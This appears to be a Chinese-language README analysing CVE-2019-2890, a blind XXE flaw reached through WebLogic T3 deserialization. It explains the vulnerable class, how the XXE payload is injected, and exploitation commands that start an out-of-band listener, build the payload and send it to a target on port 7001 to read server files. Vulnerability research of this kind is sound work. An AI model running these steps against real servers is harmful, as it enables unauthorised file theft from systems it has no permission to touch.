# weblogic_cve-2019-2890
 weblogic_cve-2019-2890

Weblogic T3反序列化XXE漏洞（CVE-2019-2890）分析
最近有空学习Weblogic T3反序列化漏洞，Weblogic反序列化漏洞采用黑名单修复，总是被大佬们找到新的利用方式。最新的反序列化漏洞CVE-2019-2890 存在XXE Blind可导致读取任意文件。

在寻找weblogic反序列化利用类时，发现weblogic.servlet.ejb2jsp.dd.EJBTaglibDescriptor类进行反序列化可导致XXE漏洞，还以为发现了0day，后来对比最新补丁，发现已经修复了，应该就是CVE-2019-2890漏洞了。
一、分析
反序列化类事件调用EJBTaglibDescriptor的readExternal方法导致漏洞发生

调用，load方法，明显从数据中读取并解析XML数据，这里没有做任何XXE防范，导致XXE漏洞。

查看一下最新补丁，新的补丁里面已经修复了该漏洞：

二、构造POC
由于weblogic.servlet.ejb2jsp.dd.EJBTaglibDescriptor在进行序列化的时候会将对象转换为XML文档，所以我们只需要修改其序列化后的数据，注入XXE的poc就行。
首先构造EJBTaglibDescriptor类

其序列化后的数据如下，包含有xml文件；

在类序列化完成后的数据中注入XXE的poc：（查找xml文件的头，并从xml头部开始替换，不要更改序列化后的结构数据）


替换后的文件已经包含了XXE的POC

三、利用
1）开启XXER工具
python xxer.py -H 192.168.17.223

2）将xxer的poc放到xx.xml文件中，替换序列化后的数据，注入xxer的poc；
java -jar weblogic_xxe.jar xx.xml
3）使用java-deserialization-exploit工具中的weblogic.py发送数据给weblogic服务器
python weblogic.py 192.168.17.222 7001 weblogic
可以看到weblogic服务器上的/tmp目录下文件信息已经被读取到

工具下载地址
Xxer:
https://github.com/TheTwitchy/xxer
java-deserialization-exploits：
https://github.com/Coalfire-Research/java-deserialization-exploits

